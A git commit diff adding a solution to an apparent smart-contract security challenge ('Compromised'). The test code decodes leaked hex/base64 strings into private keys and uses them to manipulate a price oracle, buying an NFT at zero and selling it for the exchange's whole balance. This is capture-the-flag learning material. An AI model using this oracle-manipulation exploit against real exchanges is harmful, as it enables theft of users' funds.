8006553c03e5529e2053f7584271e4859561199e
Ale <43420907+dellalibera@users.noreply.github.com>
2022-09-17 14:41:48 +0200

    Add Solution for Challenge 7 - Compromised

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -61,6 +61,45 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+
+        const eth = ethers.utils.parseEther('0.01');
+        let provider = attacker.provider
+
+        let data = [
+            "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35",
+            "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34"
+        ];
+
+        const signers = data
+            .map(d => d.replaceAll(" ", ""))
+            .map(d => Buffer.from(d, "hex").toString("utf-8"))
+            .map(d => Buffer.from(d, "base64").toString("utf-8"))
+            .map(d => new ethers.Wallet(d, provider))
+            .filter(signer => sources.includes(signer.address))
+
+
+        // lower the price
+        for (const signer of signers) {
+            await this.oracle.connect(signer).postPrice("DVNFT", 0);
+        }
+
+        // buy one
+        await this.exchange.connect(attacker).buyOne({ value: eth });
+
+        // set the price equal to the exchange balance
+        for (const signer of signers) {
+            await this.oracle.connect(signer).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        }
+
+        // sell one
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        await this.exchange.connect(attacker).sellOne(0);
+
+        // set the initial price
+        for (const signer of signers) {
+            await this.oracle.connect(signer).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        }
+        
     });
 
     after(async function () {
